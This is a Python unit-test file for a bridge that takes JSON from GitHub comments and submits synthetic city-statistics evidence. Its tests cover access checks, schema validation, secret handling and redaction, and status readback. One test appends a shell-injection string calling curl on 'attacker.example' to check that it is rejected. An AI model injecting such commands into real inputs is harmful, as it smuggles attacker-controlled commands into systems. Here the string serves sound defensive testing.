"""Synthetic security and idempotent readback tests for Yiju's GitHub bridge."""
import importlib.util
import json
from pathlib import Path
import tempfile
import unittest
from unittest.mock import patch

FILE = Path(__file__).resolve().parents[1] / 'scripts/ops/yiju_github_bridge.py'
SPEC = importlib.util.spec_from_file_location('yiju_github_bridge', FILE)
M = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(M)


def sample_payload():
    return {
        'external_id': 'yiju-test-zhangye-2025-evidence',
        'city_id': 951,
        'scope_name': '张掖市',
        'source_url': 'https://www.zhangye.gov.cn/official/test',
        'source_date': '2020-01-01',
        'source_note': '单元测试合成材料；不是真实政府证据，禁止提交生产',
        'source_type': 'government',
        'source_access': 'fetched',
        'source_excerpt': '模拟原文测试材料：医疗卫生机构数量为1391个，需核验真实政府统计原件',
        'observation_period': '2025',
        'metric_key': 'medical_health_institutions_count',
        'metric_value': 1391,
        'metric_unit': '个',
    }


def event(mode='probe', payload=None, actor='Jihai123', issue=138, comment_id=12):
    message = {'mode': mode}
    if payload is not None:
        message['payload'] = payload
    return {
        'action': 'created', 'issue': {'number': issue, 'state': 'open'},
        'comment': {
            'id': comment_id, 'user': {'login': actor},
            'body': M.PREFIX + '\n' + json.dumps(message, ensure_ascii=False)
        }
    }


class IntakeSecurityTests(unittest.TestCase):
    def test_probe_has_no_network_or_token_requirement(self):
        self.assertEqual(M.execute(event(), '')['status'], 'probe_ok')

    def test_wrong_user_and_issue_are_rejected(self):
        for ev in (event(actor='another-user'), event(issue=112)):
            with self.assertRaises(M.BridgeError):
                M.execute(ev, '')

    def test_probe_cannot_smuggle_payload(self):
        ev = event()
        ev['comment']['body'] = M.PREFIX + '\n' + json.dumps(
            {'mode': 'probe', 'payload': sample_payload()}
        )
        with self.assertRaisesRegex(M.BridgeError, 'probe_must_have_no_payload'):
            M.execute(ev, '')

    def test_comment_is_json_only_not_shell(self):
        ev = event()
        ev['comment']['body'] += '\n; curl https://attacker.example'
        with self.assertRaisesRegex(M.BridgeError, 'invalid_json'):
            M.execute(ev, '')

    def test_schema_and_source_rules(self):
        clean = sample_payload()
        M.validate_payload(clean)
        cases = [
            dict(clean, extra='secret'),
            dict(clean, source_url='http://www.zhangye.gov.cn/foo'),
            dict(clean, source_url='https://user:password@host.example/foo'),
            dict(clean, source_access='fetched', source_excerpt='tiny'),
            dict(clean, city_id=True),
            dict(clean, metric_value=float('nan')),
            dict(clean, source_type='not-valid'),
            dict(clean, source_date='2099-01-01')
        ]
        for payload in cases:
            with self.subTest(payload=payload):
                with self.assertRaises(M.BridgeError):
                    M.validate_payload(payload)

    def test_proposal_auto_apply_whitelist(self):
        payload = sample_payload()
        payload['proposal'] = {
            'field': 'avg_rent',
            'new_value': 200, 'expected_old_value': None,
            'conversion_note': '测试中的租金口径说明，禁止真实发布',
            'auto_apply': True
        }
        with self.assertRaisesRegex(M.BridgeError, 'auto_apply_field_forbidden'):
            M.validate_payload(payload)
        payload['proposal']['auto_apply'] = False
        M.validate_payload(payload)


class SubmissionTests(unittest.TestCase):
    def test_missing_secret_fails_closed(self):
        with self.assertRaisesRegex(M.BridgeError, 'missing_actions_secret'):
            M.execute(event('submit', sample_payload()), '')

    def test_submit_then_readback_returns_only_verified_status(self):
        payload = sample_payload()
        calls = []
        def sender(method, path, token, data=None):
            calls.append((method, path, token))
            if method == 'POST':
                self.assertEqual(data['external_id'], payload['external_id'])
                return {'external_id': payload['external_id'], 'city_id': 951,
                        'replayed': False}
            return {'external_id': payload['external_id'], 'city_id': 951,
                    'evidence_id': 42, 'change_request_id': None,
                    'review_status': None, 'submission_status': 'evidence_only'}
        result = M.execute(event('submit', payload), 'test-token', sender=sender)
        self.assertEqual(result['status'], 'submitted_readback_ok')
        self.assertEqual(result['evidence_id'], 42)
        self.assertEqual([call[0] for call in calls], ['POST', 'GET'])
        self.assertEqual(calls[1][1], M.BASE + '/submissions/' + payload['external_id'])
        self.assertNotIn('test-token', M.receipt_message(result))

    def test_pending_proposal_reports_correct_backend_status(self):
        payload = sample_payload()
        payload['proposal'] = {
            'field': 'location_intro',
            'expected_old_value': None,
            'new_value': '2025年本市医疗卫生机构共1391个，仍需核实社区就医距离。',
            'conversion_note': '模拟材料用数字1391，不转换为评分',
            'auto_apply': True
        }
        def sender(method, path, token, data=None):
            if method == 'POST':
                return {'external_id': payload['external_id'], 'city_id': 951,
                        'evidence_id': 43, 'change_request_id': 7,
                        'submission_status': 'pending_manual_review',
                        'review_status': 'pending', 'replayed': False}
            return {'external_id': payload['external_id'], 'city_id': 951,
                    'evidence_id': 43, 'change_request_id': 7,
                    'submission_status': 'pending_manual_review',
                    'review_status': 'pending'}
        result = M.execute(event('submit', payload), 'test-token', sender=sender)
        self.assertEqual(result['change_status'], 'pending')
        self.assertEqual(result['submission_status'], 'pending_manual_review')
        msg = M.receipt_message(result)
        self.assertIn('pending_manual_review', msg)
        self.assertIn('pending', msg)
        self.assertNotIn('approved', msg)

    def test_unreadable_proposal_review_state_is_not_a_success(self):
        payload = sample_payload()
        def sender(method, path, token, data=None):
            if method == 'POST':
                return {'external_id': payload['external_id'], 'city_id': 951}
            return {'external_id': payload['external_id'], 'city_id': 951,
                    'evidence_id': 43, 'change_request_id': 7,
                    'submission_status': 'pending_manual_review'}
        with self.assertRaisesRegex(M.BridgeError, 'missing_review_status'):
            M.execute(event('submit', payload), 'test-token', sender=sender)

    def test_mismatched_status_fails_not_as_success(self):
        payload = sample_payload()
        def sender(method, path, token, data=None):
            if method == 'POST':
                return {'external_id': payload['external_id'], 'city_id': 951}
            return {'external_id': 'wrong-id', 'city_id': 951, 'evidence_id': 4}
        with self.assertRaisesRegex(M.BridgeError, 'status_readback_mismatch'):
            M.execute(event('submit', payload), 'test-token', sender=sender)

    def test_http_client_does_not_follow_redirects(self):
        class FakeResponse:
            status = 302
            def read(self, n):
                return b''
        class FakeConnection:
            def __init__(self, host, timeout, context):
                self.host = host
                self.context = context
            def request(self, method, path, body, headers):
                self.path = path
            def getresponse(self):
                return FakeResponse()
            def close(self):
                pass
        with patch.object(M.http.client, 'HTTPSConnection', FakeConnection):
            with self.assertRaisesRegex(M.BridgeError, 'api_http_302'):
                M.api_request('GET', M.BASE + '/fields', 'A'*40)

    def test_public_receipt_contains_only_safe_fields(self):
        text = M.receipt_message({
            'status': 'blocked', 'comment_id': 12,
            'reason_code': 'missing_actions_secret',
            'raw_response': 'private credential', 'Authorization': 'Bearer private'
        })
        self.assertIn('missing_actions_secret', text)
        self.assertNotIn('private', text)
        self.assertNotIn('Bearer', text)


if __name__ == '__main__':
    unittest.main()
